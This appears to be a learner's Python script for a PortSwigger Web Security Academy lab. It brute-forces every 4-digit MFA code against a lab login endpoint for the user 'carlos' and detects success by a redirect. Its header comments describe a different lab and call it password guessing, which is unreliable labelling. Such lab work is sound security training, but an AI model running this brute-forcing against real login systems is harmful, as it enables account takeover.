# Lab8 from portswigger: Broken brute-force protection, IP block.
# This is a script for guessing the password for the login page which blocks my IP address after some failed attempts.
from contextlib import _RedirectStream, redirect_stdout
import requests
from termcolor import colored

url = "https://0a37001804ac8a19c05bebc300550027.web-security-academy.net/login2" # Set the url.
  
def get_verification_code(username):
    for code in range(1,10000):
        cookies = {
            "session": "CfLu8can6VdMXQp2GYAuPH5VWvtV3Lr8", # Change session parameter with your cookie value.
            "verify": username
            }
        data = {"mfa-code": f"{code:04d}"} 
        response = requests.post(url, cookies=cookies, data=data, allow_redirects=True)
        print(response.history) 

        '''The password will be valid if the username is "carlos" and the direction happened at least one time in the "history" list of the response during logging in so it will be succeeded.'''
        
        if (len(response.history) == 1):
            print(colored(f"[+] Valid verification code found... ","green"))
            return code
        else:
            print(colored(f"[!!] Incorrect verification code: {code:04d}\n","red"))    
                   
def main():
    username = "carlos"
    code = get_verification_code(username)
    print()
    print(colored(f"[+] Verifivation code: --> {code:04d}","green"))    

if __name__ == '__main__':
    main() 

